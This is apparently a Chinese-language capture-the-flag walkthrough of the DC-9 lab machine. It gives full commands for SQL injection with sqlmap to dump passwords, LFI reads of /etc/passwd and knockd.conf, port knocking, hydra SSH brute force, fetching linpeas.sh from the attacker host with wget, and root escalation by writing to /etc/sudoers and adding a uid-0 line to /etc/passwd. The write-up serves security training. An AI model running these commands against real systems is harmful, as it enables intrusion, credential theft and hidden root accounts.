 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/H1juasLLiJOudNFCJ7O-rQ)

**主机信息**

Kali：192.168.56.113

DC9：192.168.56.112

**实验过程**

先进行主机探测，查找靶机的 IP 地址：

```
arp‐scan ‐‐interface eth1 192.168.56.1/24
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaibWN6Y9ia13xG1Xt3bDBqzwEFXBOAMTSg6iaXrCe6FZe08yeod3B1wf5sD85ic4AhAtC6qT6VxVysAicw/640?wx_fmt=jpeg)

用 nmap 对主机进行排查确定，DC9 的 IP 地址为 192.168.56.112

可以看到 DC 开放了 80 端口以及 22 端口（被过滤）

```
nmap ‐sC ‐sV ‐oA dc‐9 192.168.56.112
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaibWN6Y9ia13xG1Xt3bDBqzwEaicZzDsvTk7yhibrsYjXTkjiaSIDZrDPEyTy2s5dWDXT0ntfA1MvibSQzg/640?wx_fmt=jpeg)

所以首先从 80 端口入手，每个网页都点开看看。看到这个搜索页面感觉可以尝试下 SQL 注入

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaibWN6Y9ia13xG1Xt3bDBqzwE2e1LuiaGSlk78e2VfSfxMmmwEq6aiavMvJ0iarr65XG0dXibp7aywvaNDw/640?wx_fmt=jpeg)

这里我们用 Burp 进行尝试，发现的确存在注入点

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaibWN6Y9ia13xG1Xt3bDBqzwEBvhmJDuGhhROAPyHBW9qUfPuqrwbaRev47PMMl9lX8L7iazHxbiciciaYQ/640?wx_fmt=jpeg)

把请求信息导出为 dc9.sqlmap，接下来用 SQLmap 进行遍历

```
python3 sqlmap.py ‐r C:\Users\DFZ\Desktop\dc9.sqlmap
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaibWN6Y9ia13xG1Xt3bDBqzwEUsmnAXTJnOvIU92SDVFHPzLST2dM0glLg4XfFhMLDpaSbwbDjs276A/640?wx_fmt=jpeg)

然后接下来用 sqlmap 导出数据

```
python3 sqlmap.py ‐r C:\Users\DFZ\Desktop\dc9.sqlmap ‐‐dbs 
python3 sqlmap.py ‐r C:\Users\DFZ\Desktop\dc9.sqlmap ‐D users ‐‐tables
python3 sqlmap.py ‐r C:\Users\DFZ\Desktop\dc9.sqlmap ‐D users ‐T UserDetails ‐‐columns
python3 sqlmap.py ‐r C:\Users\DFZ\Desktop\dc9.sqlmap ‐D users ‐T UserDetails ‐C
username,password ‐‐dump
```

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaibWN6Y9ia13xG1Xt3bDBqzwEdZlp9mYRLONFIXLVCeBf8ia3BAQIO6OqoicLKKVib4O1j0nuyOumiaicbRA/640?wx_fmt=png)

```
python3 sqlmap.py ‐r C:\Users\DFZ\Desktop\dc9.sqlmap ‐D Staff ‐T Users ‐C Username,Password ‐‐dump
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaibWN6Y9ia13xG1Xt3bDBqzwEiam5nBWGTqf3l0QhlITf0Uzd0nfYQDGovNPs5xgtSnpmUZJyxnJzGDA/640?wx_fmt=jpeg)

这里 SQLmap 直接帮我得到 admin 的密码明文（transorbital1）

```
管理员账号：admin
管理员密码：transorbital1
```

附在线破解网站：https://hashes.com/en/decrypt/hash

我们将所有的账号，密码进行整理, 分别整理到 username,password(这里需要注意的是，只要管理员 的密码是需要解密的，其他用户的密码是明文)

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaibWN6Y9ia13xG1Xt3bDBqzwE7xUMic2yzJzQKQqvB6SWFUG6Qa9Bprm8yx2U2t8w4l3dWjbfmp0jl5g/640?wx_fmt=png)

用 wfuzz 进行批量登陆查看页面反应，只有管理员的账号是 302 （ps：意料之中)

```
‐c:带颜色输出 ‐d:post参数 ‐z:payload ‐m:模式 zip迭代 字典和占位符一一对应进行遍历
wfuzz ‐c ‐z file,username ‐z file,password ‐m zip ‐d 'username=FUZZ&password=FUZ2Z' http://192.168.56.112/manage.php
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaibWN6Y9ia13xG1Xt3bDBqzwE1SLjUca5GxqphGybh5zZsKkVicQ8qZibNPUzicz9HXrU89AibCCKgCJp9w/640?wx_fmt=jpeg)

然后我们用管理账号进行登陆

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaibWN6Y9ia13xG1Xt3bDBqzwEuzon98cxmBKPBODfhpAxOINqTmVv6KFcX6nOv5o0bfRZM0KuaxPD4w/640?wx_fmt=jpeg)

可以看到页面下面出现 File does not exist 的提示，感觉很有可能就是 LFI（本地文件包含）

但是此时我们并不知道参数是多少，这里同样用 wfuzz 尝试进行遍历（注意这里用把登陆之后的 cookies 也要写上，否则网页会提示你要登陆）

查看 cookies 的话可以浏览器直接查看，也可以让 wfuzz 把请求发给 burp 进行查看

```
#‐p:添加代理
wfuzz ‐p 127.0.0.1:8080:HTTP
```

字典地址：https://github.com/danielmiessler/SecLists

```
‐b:cookies ‐hw:隐藏指定字节数的结果 ‐w 字典文件
wfuzz ‐‐hw 100 ‐b 'PHPSESSID=oshc5jht0a15efnue128kdnn9n' ‐c ‐w 
/usr/share/SecLists/Discovery/Web‐Content/burp‐parameter‐names.txt 
http://192.168.56.112/manage.php?FUZZ=index.php

wfuzz ‐‐hw 100 ‐b 'PHPSESSID=oshc5jht0a15efnue128kdnn9n' ‐c ‐w 
/usr/share/SecLists/Discovery/Web‐Content/burp‐parameter‐names.txt 
http://192.168.56.112/manage.php?FUZZ=../../../../../../../../../etc/passwd
```

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaibWN6Y9ia13xG1Xt3bDBqzwERn6RfOHTVoHXTtUQWcCmIfx4CBibk7JA9pQuG86XIjdVpQicV62aKVVQ/640?wx_fmt=png)

这里我们就找到参数 file

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaibWN6Y9ia13xG1Xt3bDBqzwEVxkWlukb6csRXl9xNbkr6PG57QvTFpWFdibjMRYFUUtj2QnrlR9Cd5w/640?wx_fmt=jpeg)

然后我们通过 **/proc/sched_debug** 来查看 Linux 系统中任务的调度情况

```
http://192.168.56.112/manage.php?FUZZ=../../../../../../../../../proc/sched_debug
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaibWN6Y9ia13xG1Xt3bDBqzwE2L66Ywh4miahqSvrIXP8WD5Cru7w5h9UBuEy70CU7zD8To9yxY3AkJg/640?wx_fmt=jpeg)

整理查询发现靶机上运行这 knockd

关于 knockd 的介绍：https://blog.csdn.net/nzjdsds/article/details/112476120

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaibWN6Y9ia13xG1Xt3bDBqzwEL1LTzhyg7AmGSyHsMDqSSsqMDuUiaTT4iaibY25KTOJJ5iaiboTtODqYJcQ/640?wx_fmt=jpeg)

那么我们读取下 knockd 的配置文件

```
http://192.168.56.112/manage.php?FUZZ=../../../../../../../../../etc/knockd.conf
```

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaibWN6Y9ia13xG1Xt3bDBqzwEEzDTj24tGTcfIYaf44stLs28eBiaHJMXMAjlq3Kyn2EMFDOr27AMQWg/640?wx_fmt=png)

```
options] 
        UseSyslog
[openSSH] 
        sequence = 7469,8475,9842 
        seq_timeout = 25 
        command = /sbin/iptables ‐I INPUT ‐s %IP% ‐p tcp ‐‐dport 22 ‐j ACCEPT 
        tcpflags = syn
[closeSSH] 
        sequence = 9842,8475,7469 
        seq_timeout = 25 
        command = /sbin/iptables ‐D INPUT ‐s %IP% ‐p tcp ‐‐dport 22 ‐j ACCEPT 
        tcpflags = syn
```

这里提供 2 种敲击方法：nc、nmap

```
for x in 7469 8475 9842;do nmap ‐Pn ‐‐max‐retries 0 ‐p $x 192.168.56.112;done 
for x in 7469 8475 9842 22 ;do nc 192.168.56.112 $x;done
```

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaibWN6Y9ia13xG1Xt3bDBqzwEK2V8yJ6oq0c3SLJcdczfA0SUEUO8L9ia4QBebGU2wzkyIxzqKmFcq0A/640?wx_fmt=png)

此时 SSH 就可以正常连接，接下来我们用 hydra 来进行爆破，用户名和密码就是我们先前 SQL 注入获得的

```
hydra ‐L username ‐P password ssh://192.168.56.112
```

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaibWN6Y9ia13xG1Xt3bDBqzwE70mL15Iv2zlsHFEf9n18eTa8TRictLdM91PZ5lFl812ndjicDadP0xmg/640?wx_fmt=png)

```
[22][ssh] host: 192.168.56.112 login: janitor password: Ilovepeepee 
[22][ssh] host: 192.168.56.112 login: joeyt password: Passw0rd 
[22][ssh] host: 192.168.56.112 login: chandlerb password: UrAG0D!
```

然后我们对这几个账号都尝试进行登陆

```
ssh janitor@192.168.56.112
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaibWN6Y9ia13xG1Xt3bDBqzwEjttrC3OSc2ar5O8xEaLEwZDpgmLagx2wXKp54IIBMdnP0e3tCKPwxw/640?wx_fmt=jpeg)

只有 janitor 的家目录存在一个名为. secrets-for-putin 的文件夹，并且在其中又得到一些密码

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaibWN6Y9ia13xG1Xt3bDBqzwEicJ9zdDtibZfaG9m8VOQEwPlQvBzBKiaCrxI2sGjliczsDCwtENdnhUXYQ/640?wx_fmt=jpeg)

我们把这些密码加入到 password 文件中

同时我们在 janitor 使用 LinPEAS 来探测下可利用的点

下载地址：https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite

现在 Kali 上开启 HTTP 服务

```
python3 ‐m http.server 80
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaibWN6Y9ia13xG1Xt3bDBqzwEjoK8X7SwvVJgPqrqDDdPkuHHaFc1FdSrHjU4CMAPE6gjvLicQfoxQ5A/640?wx_fmt=jpeg)

然后在靶机上进行下载

```
wget http://192.168.56.114/linpeas.sh
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaibWN6Y9ia13xG1Xt3bDBqzwEpZVA7m8ibicWXK6ElkMHsGUa2BuxfqgWbRVAOLGluSQgibSrQQ2Y2FIMQ/640?wx_fmt=jpeg)

然后运行之后，感觉并没有什么特别的点

```
bash linpeas.sh
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaibWN6Y9ia13xG1Xt3bDBqzwE3JFLZhfZKTmVDWthyNQtNIlicFqntzHwb8RiafSQqstQpoV63aWbjiaTA/640?wx_fmt=jpeg)

再使用 hydra 使用刚刚更新过的 password 文件进行 SSH 爆破, 可以看到多了一个 fredf 用户

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaibWN6Y9ia13xG1Xt3bDBqzwElxbXXXRPBu0jMjEHpAqIQ1nOYPjDxAefpp8xldmiabPWeuZH4Q3pQdw/640?wx_fmt=png)

```
[22][ssh] host: 192.168.56.112 login: fredf password: B4‐Tru3‐001 
[22][ssh] host: 192.168.56.112 login: janitor password: Ilovepeepee 
[22][ssh] host: 192.168.56.112 login: joeyt password: Passw0rd 
[22][ssh] host: 192.168.56.112 login: chandlerb password: UrAG0D!
```

然后登陆到 fredf 账号，查看下 fredf 的 sudo 权限, 可以看到 fredf 可以不用密码以 root 权限执 行 / opt/devstuff/dist/test/test 的文件

```
sudo ‐l
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaibWN6Y9ia13xG1Xt3bDBqzwE2gW96IubUIJLFG0MCNsH1qtzeb6ypxrHvG0ecxVxRyIY7DrNtR6mvA/640?wx_fmt=jpeg)

/opt/devstuff/dist/test/test 是一个可执行文件，执行后出现下面的提示，应该是一个 python 脚本转化为的可执行的文件

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaibWN6Y9ia13xG1Xt3bDBqzwEIC7lrT7M3qV1A2fNDKJjDPczawOLb4BicHmrtG61g7xPaiaW47HSAaGQ/640?wx_fmt=jpeg)

可以在上级目录找到同名的 test.py 然后 cat 下内容，应该是由这个文件编译过来的

脚本的作用就是将第一个文件的内容附加到另一个文件里面去

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaibWN6Y9ia13xG1Xt3bDBqzwEFXKqL7HIaDFjzoJV9yUibl7fl2U1XSxm6Ddia6cOdicVI9Oc0YQxNJ65A/640?wx_fmt=jpeg)

这样提权就变得非常简单，这里提供 2 个提权的思路

提权思路 1：往 / etc/sudoers 里面添加内容，让用户可以以 root 的权限去执行命令

创建 / dev/shm/sudoerAdd，内容如下

```
joeyt ALL=(ALL) ALL
```

然后执行

```
sudo /opt/devstuff/dist/test/test /dev/shm/sudoerAdd /etc/sudoers
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaibWN6Y9ia13xG1Xt3bDBqzwEbfwB7anJsILWgfB7An1CianzWZica3icYxWngXH0ZMLFcTz1X3vicuEIlg/640?wx_fmt=jpeg)

然后登陆 joeyt，然后切换成 root 身份，get flag

提权思路 2：添加一个新的用户到 / etc/passwd，然后新添加的用户登陆

这里用 Openssl 来对密码进行加密, 在进行编辑输入到 / tmp/new-passwd

```
openssl passwd ‐1 ‐salt 123456 dfz
```

```
dfz:$1$123456$1VU0YpuL7WOQvLLyYTbbv1:0:0:root:/root:/bin/bash
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaibWN6Y9ia13xG1Xt3bDBqzwESbKHytTBxdxc65ydVXJddmBiaReL0D0VZNUWicI5N1kyEFlcPtgpjPIA/640?wx_fmt=jpeg)

然后把 / tmp/new-passwd 写入到 / etc/passwd

```
sudo /opt/devstuff/dist/test/test /tmp/new‐passwd /etc/passwd
```

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaibWN6Y9ia13xG1Xt3bDBqzwEicbolG705ONCx4MSm3HWv2nM1nEs40picic2XudjrQtTO4mOmTXGq9lpw/640?wx_fmt=png)

**靶机下载地址：http://www.five86.com/downloads/DC-9.zip**  

